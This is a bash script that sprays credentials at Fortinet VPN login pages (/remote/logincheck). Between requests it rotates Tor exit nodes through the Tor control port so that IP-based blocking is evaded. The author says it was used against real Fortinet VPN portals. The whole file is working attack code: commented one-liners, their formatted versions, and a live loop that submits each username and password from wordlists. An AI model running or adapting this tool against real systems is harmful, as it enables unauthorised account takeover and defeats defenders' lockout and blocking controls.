#!/bin/bash

# Description:
## To attempt to circumvent IP blocking after a few authenticationa attempts
## The script spreads each `curl` request towards a target via different tor nodes.
## Each curl request would originate from a different tor node which may help in bruteforcing a login page (non-cloud based usually)
## I've used this one to spray credentials towards Fortinet VPN portals

# Prerequisite:
# Install torify
# Source: https://wildcardcorp.com/blogs/tor-torify-torsocks

####### The commands below are the basis for a fresh/new connection to a tor node and making a `curl` request right after. #######
###
# echo -e 'AUTHENTICATE ""\r\nsignal NEWNYM\r\nQUIT' | nc 127.0.0.1 9051 && torify curl ifconfig.me 2> /dev/null
###


####### For looping through a list of username:password pairs i.e. user1:P@sswUser1 #######
# for line in $(cat all_names.txt); do  echo -e 'AUTHENTICATE ""\r\nsignal NEWNYM\r\nQUIT' | nc 127.0.0.1 9051; sleep 10;echo ""; torsocks curl ifconfig.me;echo ""; user=$(echo $line|cut -d : -f 1); pass=$(echo $line|cut -d : -f 2); echo ${user}:${pass} && torify curl -i -s -k -X 'POST' -H 'Host: vpn.domain.com:8443' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Pragma: no-cache' -H 'Cache-Control: no-store, no-cache, must-revalidate' -H 'If-Modified-Since: Sat, 1 Jan 2000 00:00:00 GMT' -H 'Content-Type: text/plain;charset=UTF-8' -H 'Origin: https://vpn.domain.com:8443' -H 'Dnt: 1' -H 'Referer: https://vpn.domain.com:8443/remote/logincheck?lang=en' -H 'Sec-Gpc: 1' -H 'Te: trailers' -H 'Connection: close'     --data-binary "ajax=1&username=${user}&realm=&credential=${pass}"     'https://vpn.domain.com:8443/remote/logincheck' 2>/dev/null;echo "\n";done
# Below is the formatted equivalent of line above:
###
# for line in $(cat all_names.txt)
# do
# echo -e 'AUTHENTICATE ""\r\nsignal NEWNYM\r\nQUIT' | nc 127.0.0.1 9051
# sleep 10
# echo ""
# torsocks curl ifconfig.me
# echo ""
# user=$(echo $line|cut -d : -f 1)
# pass=$(echo $line|cut -d : -f 2)
# echo ${user}:${pass}
# 
# torify curl -i -s -k -X 'POST' \
# -H 'Host: vpn.domain.com:8443' \
# -H 'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_1_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Edg/89.0.774.68' \
# -H 'Accept: */*' \
# -H 'Accept-Language: en-US,en;q=0.5' \
# -H 'Accept-Encoding: gzip, deflate' \
# -H 'Pragma: no-cache' \
# -H 'Cache-Control: no-store, no-cache, must-revalidate' \
# -H 'If-Modified-Since: Sat, 1 Jan 2000 00:00:00 GMT' \
# -H 'Content-Type: text/plain;charset=UTF-8' \
# -H 'Origin: https://vpn.domain.com:8443' \
# -H 'Dnt: 1' \
# -H 'Referer: https://vpn.domain.com:8443/remote/logincheck?lang=en' \
# -H 'Sec-Gpc: 1' \
# -H 'Te: trailers' \
# -H 'Connection: close' \
# --data-binary "ajax=1&username=${user}&realm=&credential=${pass}" \
# 'https://vpn.domain.com:8443/remote/logincheck' 2>/dev/null
# 
# echo "\n"
# done
###


####### For password spraying using a list of usernames and a list of password to try with #######
# Example Username list:
## user1
## user2
# Password ist:
## P@sswUser1
## $up3r$3cur3
# Giving the attempts/output of
# user1:P@sswUser1
# user2:P@sswUser1
# user1:$up3r$3cur3
# user2:$up3r$3cur3

# for password in $(cat ~/Wordlist/testpasswords.txt);do for username in $(cat ~/Wordlist/testusers.txt); do  echo ${username}:${password} >>curl_output.txt && echo "" >>curl_output.txt && curl -i -s -k -X 'POST' -H 'Host: domain.com:12443' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Pragma: no-cache' -H 'Cache-Control: no-store, no-cache, must-revalidate' -H 'If-Modified-Since: Sat, 1 Jan 2000 00:00:00 GMT' -H 'Content-Type: text/plain;charset=UTF-8' -H 'Origin: https://webmail.domain.com:12443' -H 'Dnt: 1' -H 'Referer: https://domain.com:12443/remote/login?lang=en' -H 'Sec-Gpc: 1' -H 'Te: trailers' -H 'Connection: close'     --data-binary "ajax=1&username=${username}&realm=&credential=${password}" -x http://127.0.0.1:8080 'https://domain.com:12443/remote/logincheck' >>curl_output.txt  2>/dev/null;echo "\n" >>curl_output.txt ;done;done
# Below is the formatted equivalent of line above:

for password in $(cat ~/Wordlist/testpasswords.txt)
do

for username in $(cat ~/Wordlist/testusers.txt)
do
echo ${username}:${password} >> curl_output.txt
echo "" >> curl_output.txt
torify curl -i -s -k -X 'POST' \
-H 'Host: vpn.domain.com:8443' \
-H 'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_1_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Edg/89.0.774.68' \
-H 'Accept: */*' \
-H 'Accept-Language: en-US,en;q=0.5' \
-H 'Accept-Encoding: gzip, deflate' \
-H 'Pragma: no-cache' \
-H 'Cache-Control: no-store, no-cache, must-revalidate' \
-H 'If-Modified-Since: Sat, 1 Jan 2000 00:00:00 GMT' \
-H 'Content-Type: text/plain;charset=UTF-8' \
-H 'Origin: https://vpn.domain.com:8443' \
-H 'Dnt: 1' \
-H 'Referer: https://vpn.domain.com:8443/remote/logincheck?lang=en' \
-H 'Sec-Gpc: 1' \
-H 'Te: trailers' \
-H 'Connection: close' \
-x http://127.0.0.1:8080 \
--data-binary "ajax=1&username=${username}&realm=&credential=${password}" \
'https://vpn.domain.com:8443/remote/logincheck' >> curl_output.txt  2>/dev/null
echo "\n" >> curl_output.txt
done

done
